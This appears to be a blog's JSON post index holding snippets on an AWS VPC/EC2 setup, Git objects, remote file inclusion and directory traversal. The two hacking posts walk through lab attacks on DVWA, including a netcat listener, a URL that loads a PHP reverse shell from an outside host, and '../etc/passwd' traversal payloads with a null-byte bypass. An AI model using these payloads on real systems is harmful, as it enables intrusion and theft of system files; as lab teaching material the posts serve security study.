[ { "title": "creating a VPC and launch web application on Amazone EC2", "url": "/posts/creating-a-VPC-and-launch-web-application-on-Amazon-EC2/", "categories": "cloud, AWS compute services", "tags": "cloud, Amazon EC2, Security, Networking, virtual machine, VPC, deployment", "date": "2022-12-15 00:00:00 +0000", "snippet": "Cloud ?The cloud is a datacenter , that’s all , if you have a company you should create a space to install your own servers , so you will need high capacity of electricity ,when you have a hundred of servers in your datacenter and every one consume 200 W or 500 W that’s mean a lot of KW of heat in closed zone , you need air conditioner . People to maintain the servers , security (hardware , software).The cloud help you to ovoid all these problems , you will spend more time to scale your application Time to market.this is my own definition you can know more from Google.So anyone can make his own servers and start to deploying , cloning , managing … , in the past only the monsters companies who can attack world clients, but today nobody live on the end of this planet can buy a server on Tokyo or London …Top 10 Cloud Service Providers Globally in 2022: Amazon Web Services (AWS) Microsoft Azure Google Cloud Platform (GCP) Alibaba Cloud Oracle Cloud IBM Cloud (Kyndryl) Tencent Cloud OVHcloud DigitalOcean Linode (Akamai)AWS :Well AWS simply just provides cloud computing services. Those IT resources mentioned in the cloud computing definition are AWS services in this case. We’ll need to use these AWS services to architect a scalable, highly available, and cost effective infrastructure to host our corporate directory application. This way we can get our corporate directory app out into the world quickly, without having to manage any heavy-duty physical hardware. There are the six main advantages to running your workloads on AWS.The Six Benefits of Cloud ComputingPay as you go. Instead of investing in data centers and hardware before you know how you are going to use them, you pay only when you use computing resources, and pay only for how much you use.Benefit from massive economies of scale. By using cloud computing, you can achieve a lower cost than you can get on your own. Because usage from hundreds of thousands of customers is aggregated in the cloud, AWS can achieve higher economies of scale, which translates into lower pay as-you-go prices.Stop guessing capacity. Eliminate guessing on your infrastructure capacity needs. When you make a capacity decision prior to deploying an application, you often end up either sitting on expensive idle resources or dealing with limited capacity. With cloud computing, these problems go away. You can access as much or as little capacity as you need, and scale up and down as required with only a few minutes notice.Increase speed and agility. IT resources are only a click away, which means that you reduce the time to make those resources available to your developers from weeks to just minutes. This results in a dramatic increase in agility for the organization since the cost and time it takes to experiment and develop is significantly lower.Stop spending money running and maintaining data centers. Focus on projects that differentiate your business, not the infrastructure. Cloud computing lets you focus on your customers, rather than on the heavy lifting of racking, stacking, and powering physical infrastructure. This is often referred to as undifferentiated heavy lifting.Go global in minutes. Easily deploy your application in multiple Regions around the world with just a few clicks. This means you can provide lower latency and a better experience for your customers at a minimal cost.Get started by launch your web application on Amazone EC2Before starting, create your own accountVPC is a private network that make us to deploy our instance (virtual machine) Task 1: Creating the VPC In this task, you will create a new VPC. In the Services search box, enter VPC and open the VPC console by choosing VPC from the list.In the navigation pane, under Virtual private cloud, choose Your VPCs.Choose Create VPC, Configure these settings:Name tag:my-vpc IPv4 CIDR block: 10.1.0.0/16In the navigation pane, under Virtual private cloud, choose internet gateways (is like a router is not physical thing , it’s just configuration , make us to connect our VPC with the World Wide Web)Choose Create internet gateway.For Name tag, paste app-igw and choose Create internet gateway.In the details page for the internet gateway, choose Actions and then choose Attach to VPC.For Available VPCs, choose my-vpc and then choose Attach internet gateway. Task 2: Creating subnets In this task, you will create the four subnets for your VPC. You will configure the two public subnets first, and then configure the two private subnets.From the navigation pane, choose Subnets. Choose Create subnet.For the first public subnet, configure these settings:VPC ID: my-vpcSubnet name:Public Subnet 1Availability Zone: Choose the first Availability ZoneExample: If you are in US West (Oregon), you would choose us-west-2aIPv4 CIDR block: 10.1.1.0/24Choose Add new subnet.For the second public subnet, configure these settings:Subnet name: Public Subnet 2Availability Zone: Choose the second Availability ZoneExample: If you are in US West (Oregon), you would choose us-west-2bIPv4 CIDR block: 10.1.2.0/24Choose Add new subnet and for the first private subnet, configure these settings:Subnet name: Private Subnet 1Availability Zone: Choose the first Availability ZoneExample: If you are in US West (Oregon), you would choose us-west-2aIPv4 CIDR block: 10.1.3.0/24.Choose Add new subnet and for the second private subnet, configure the following:Subnet name: Private Subnet 2Availability Zone: Choose the second Availability ZoneExample: If you are in US West (Oregon), you would choose us-west-2bIPv4 CIDR block: 10.1.4.0/24Finally, choose Create subnet.After the subnets are created, select the check box for Public Subnet 1.Choose Actions and then choose Edit subnet settings.For Auto-assign IP settings, select Enable auto-assign public IPv4 address and then choose Save.Clear the check box for Public Subnet 1 and select the check box for Public Subnet 2.Again, choose Actions and then Edit subnet settings.For Auto-assign IP settings, select Enable auto-assign public IPv4 address and save the settings. Task 3: Creating route tables In this task, you will create the route tables for your VPC. First, you will create the public route table.In the navigation pane, choose Route Tables.Choose Create route table.For the route table, configure these settings:Name: app-routetable-publicVPC: my-vpcChoose Create route table.If needed, open the route table details pane by choosing app-routetable-public from the list.Choose the Routes tab and choose Edit routes.Choose Add route and configure these settings:Destination: 0.0.0.0/0Target: Internet Gateway, then choose app-igw (which you set up in the VPC task)Choose Save changes.Choose the Subnet associations tab.Scroll to Subnets without explicit associations and choose Edit subnet associations.Select the two public subnets that you created (Public Subnet 1 and Public Subnet 2) and choose Save associations.Next, you will create the private route table.In the navigation pane, choose Route Tables.Choose Create route table and configure these settings:Name: app-routetable-privateVPC: my-vpcChoose Create route table.If needed, open the details pane for app-routetable-private by choosing it from the list.Choose the Subnet associations tab.Scroll to Subnets without explicit associations and choose Edit subnet associations.Select the two private subnets (Private Subnet 1 and Private Subnet 2) and choose Save associations. Task 4: Launching an EC2 instance that uses a role Now that you have created a network, you will launch your EC2 instance by using the VPC that you created!In the search box, enter EC2 and open the Amazon EC2 console by choosing EC2 from the list.In the navigation pane, choose Instances and choose Launch instances.For Name use my-first-app-in-aws.Under Application and OS Images (Amazon Machine Image), choose Amazon Linux.Under Instance type, select t2.micro.Under Key pair (login) choose create new key pair.Configure the following settings under Network settings and Edit.VPC: my-vpcSubnet: Public Subnet 1Auto-assign Public IP: EnableUnder Firewall (security groups) choose Create security group. Use web-security-group as the Security group name and change Description to Enable HTTP access.Under Inbound security groups rules choose Remove above the ssh rule.Choose Add security group rule. For Type choose HTTP. Under Source type choose Anywhere.Choose Add security group rule. For Type choose HTTPS. Under Source type choose Anywhere.Expand Advanced details and under IAM instance profile choose S3DynamoDBFullAccessRole.In the User data box, paste the following code:#!/bin/bash -ex [ #!/bin/bash -ex] wget https://aws-tc-largeobjects.s3-us-west-2.amazonaws.com/DEV-AWS-MO-GCNv2/FlaskApp.zip [ wget https://aws-tc-largeobjects.s3-us-west-2.amazonaws.com/DEV-AWS-MO-GCNv2/FlaskApp.zip] unzip FlaskApp.zip [ unzip FlaskApp.zip] [ cd FlaskApp/] cd FlaskApp/yum -y install python3 mysqlpip3 install -r requirements.txtamazon-linux-extras install epelyum -y install stressexport PHOTOS_BUCKET=${SUB_PHOTOS_BUCKET}export AWS_DEFAULT_REGION=&lt;INSERT REGION HERE&gt;export DYNAMO_MODE=onFLASK_APP=application.py /usr/local/bin/flask run --host=0.0.0.0 --port=80Example:This example uses the US West (Oregon) Region, or us-west-2.export AWS_DEFAULT_REGION=us-west-2Note: You still don’t need to change the SUB_PHOTOS_BUCKET variable in the user data script, is just a bucket to store the pictures using Amazon s3 bucket service, you can create your own bucket ,visit-this-linkChoose Launch instance.Choose View all instances.The instance should now be listed under Instances.Wait for the Instance state to change to Running and the Status check to change to 2/2 checks passed.Note: Often, the status checks update, but the console user interface (UI) might not update to reflect the most recent information. You can minimize waiting by refreshing the page after a few minutes.Select the running my-first-app-in-aws instance by selecting its check box.On the Details tab, copy the Public IPv4 address.Note: Make sure that you only copy the address instead of choosing the open address link.In a new browser window, paste the IP address that you copied. Make sure to remove the ‘S’ after HTTP so you are using only HTTP instead.In a new browser window, paste the IP address that you copied." }, { "title": "Git Objects", "url": "/posts/Git-Objects/", "categories": "development, git", "tags": "development, git, repository, github, managing system, Unix, Lunix", "date": "2022-09-15 00:00:00 +0000", "snippet": "Git ObjectsGit is a managing system the core of Git is a simple key-value data store , you can insert any kind of content into your repository , for which git will hand you back a unique key you can use later to read your content.Is a definition from git community.So actually objects is where git stores its representation of all files, directories, and commits that’s it.if you want to know more deeply stuff you can read git documention , because in this post i will do a real example of git objects ,Types of git objectsIf you have read documentation git, you know that git stores different types of objects in .git/objects. The object types are: Blobs - Contain the contents of a file. Trees - List the contents of a directory, connecting “blobs” with names and permissions to reference files and subdirectories. Commits - Store a reference to a specific version of the code (a single tree), the direct parentage (parent commit hash(es)), and other metadata.practice git objectsThe best way to practice git is to use it. Create a directory, add some files, make some changes, explore and answer any outstanding questions you might have thru hands on practice. This will help clear up things and help build muscle memory.so in this post i will use my personal tool that i use it to practice my knowledge in git , really recommendedfor us as beginners is : git-katas the name of the folder that contains a exercise in object is :investigation ,open the README.md file to understand the object of this exercise and get started with your task:$ cd inverstigation$ ls$ cat README.md$ source setup.shfind the objectsin order to see objects in this repository tree is our friend.$ tree -aC -a : see all files, including the hidden ones -C : color optionthis is our tree related to .git folder ,but most important folder here is actually the objects , so is contains some subfolders and some files , so what all those files mean ?so we will try to grap the full file of object or the full file name of object , actually file contains a hash as you can see here, but full hash begins with sub name then the file name , so we will try actually to get the whole file name or full hash , so find command is our friend$ find .git/objects -type f so we get i six files path but me as i told you, im interested in the subfolder name and file name , so we will try to use the awk command to get only what we want$ find .git/objects/ -type f | awk -F/ '{print $3$4}so i get the full hash of the files object actually in this directory , so the first command that i’m going to use is actually to see the type of these object$ git cat-file -t hashor you can print to see the content of hash$ git cat-file -p hashwe know that git is a managing system that’s mean he must help me to full managing my files , so when i use git i should feel power and fast.sometimes you will have huge files in your repository that’s mean massive objects , so in this case you can’t check the files one by one is , so this command line help you to get all the type or all the content of your object in one line fast (DRY)$ for i in $(find .git/objects -type f | awk -F/ '{print $3$4}'); git cat-file -t $i" }, { "title": "Remote file inclusion", "url": "/posts/Remote-file-inclusion/", "categories": "Penetration Tester, Web Hacking, file inclusion", "tags": "web hacking, file inclusion", "date": "2022-09-14 00:00:00 +0000", "snippet": "Remote file inclusion (RFI)What is RFIRemote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts , so the hacker can host his web server in the client of the victim that’s to give him the power to do a lot of things : Code execution on the web server Executing client-side code like JavaScript that can lead to other attacks like Cross-site scripting (XSS). Denial of Service (DoS) Data Theft / Manipulationhow hacker discover this vulnerabilitiesSee this postRemote file inclusion examplesi will attack my DVWA labFirst we need reverse PHP shell This script will open an outbound TCP connection from the web server to a host and port of your choice. Bound to this TCP connection will be a shell.if you are php developer you can build your own , is available in GitHub:Open the php-reverse-shell.php file by nano or any editor and try to verify double thing of course the ip and the portNow we need to create a web server ,me i use python web server ,you can use other one doesn’t matter.To start a webserver run the command below:python3 -m http.server 8888Now i will use netcat to listening in the target by his port , so netcat functions as a back-end tool that allows for port scanning and port listening.To start listening on 4444: sudo nc -lvnp 4444 -l : listen mode, for inbound connects -v verbose [use twice to be more verbose] -n numeric-only IP addresses, no DNS -p port local port number (port numbers can be individual or ranges: lo-hi [inclusive])Ultimate step is run this shell in the victim client http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://0.0.0.0:8888/php-reverse-shell.phpour shell is get in the web server of the victim with successfullynow we have the full control on the server, we can run any command we want and access to any hidden file" }, { "title": "file inclusion :directory traversal", "url": "/posts/file-inclusion-directory-traversal/", "categories": "Penetration Tester, Web Hacking, file inclusion", "tags": "web hacking, file inclusion", "date": "2022-09-12 22:40:00 +0000", "snippet": "File InclusionMany web application allow the user to get access into files streams or allows the user to upload files on the server . So other bad guys use this weakness for doing bad thing in the server like see some secret file or execute a malicious file.how hacker discover this vulnerabilitiesthe easiest way to see if an application is vulnerable to this type of attack is by simply determining if a URL uses a GET query. A GET request contains the parameters directly in the URL and would look something like this:http://examplesite.com/?file=index.phpthe website trust all his files ?para=file.html , so the hacker try to spoof to access on the web serverDirectory traversali will start by what directory traversal is, describe how to carry out path traversal attacks and circumvent common obstaclesWhat is directory traversaldirectory traversal is a web security vulnerability that make us as a hacker to read any file in the web server (include application code and data, credentials for back-end systems, and sensitive operating system files)Climbing the DirectoryBy appending ../ directly to the file path in the URL, we can attempt to change into higher directories in an effort to view system files and information not meant to be internet-facing.http://examplesite.com/?file=../../../../etc/passwdAfter climbing a few more levels, we finally hit paydirt and the contents of /etc/passwd are displayed to us right in the browser:other caseIf an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:filename=../../../etc/passwd%00.pngvarious non-standart encodings (Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect) by pass input filterData Encoding: Non-Standard Encoding .so the solution is using a null byte to effectively terminate the file path before the required extension." } ]
